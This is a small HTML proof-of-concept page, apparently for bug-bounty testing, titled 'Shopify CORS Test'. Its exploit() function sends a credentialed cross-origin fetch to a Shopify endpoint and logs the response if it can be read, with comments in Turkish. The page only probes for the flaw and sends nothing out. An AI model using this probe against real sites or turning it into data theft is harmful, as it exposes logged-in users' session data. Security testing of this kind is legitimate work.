<!DOCTYPE html>
<html>
  <body>
    <h1>Shopify CORS Test</h1>
    <button onclick="exploit()">Send CORS Request</button>

    <script>
      function exploit() {
        fetch("https://www.shopify.com/__dux", {
          method: "GET",
          credentials: "include", // Oturum bilgilerini çeker
        })
        .then(response => {
          if (response.ok) {
            console.log("CORS açığı var. Response geldi.");
            return response.text();
          } else {
            console.error("CORS isteği başarısız.");
          }
        })
        .then(text => {
          console.log("Cevap:", text);
        })
        .catch(error => {
          console.error("Hata:", error);
        });
      }
    </script>
  </body>
</html>
